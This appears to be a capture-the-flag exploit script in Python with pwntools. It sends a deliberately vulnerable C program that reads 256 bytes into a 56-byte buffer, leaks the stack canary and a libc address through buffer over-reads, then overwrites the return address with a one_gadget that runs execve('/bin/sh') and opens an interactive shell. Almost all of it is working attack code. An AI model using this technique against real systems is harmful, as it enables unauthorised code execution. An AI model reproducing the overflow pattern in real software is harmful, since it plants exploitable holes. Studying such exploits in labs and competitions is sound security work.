from pwn import *

# change 256 -> " 56"

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./main')
r = remote('0', 1234)

''' for remote '''

data = '''#include <stdio.h>

int main(int argc, char **argv)
{
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
        char buf[ 56];

	read(0, buf, 256);
	puts(buf);

	read(0, buf, 256);
	puts(buf);

	read(0, buf, 256);
	return 0;
}
$'''.strip().replace(' '*8, '\t')

r.sendline(data)

''' end '''

p1 = 'A'*56 + '\n'
r.send(p1)

r.recvuntil(p1)

canary = '\x00' + r.recv(7)

some = r.recv(6) + '\x00\x00'

print hex(u64(canary))
print hex(u64(some))


p2 = 'A'*56 + 'B'*15 + '\n'
r.send(p2)
r.recvuntil(p2)

libc = u64(r.recv(6) + '\x00\x00') - 0x21b97

print hex(libc)

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

p3 = 'A'*56 + canary + some + p64(libc + 0x4f2c5)

# gdb.attach(r, 'c')

r.sendline(p3)

r.interactive()

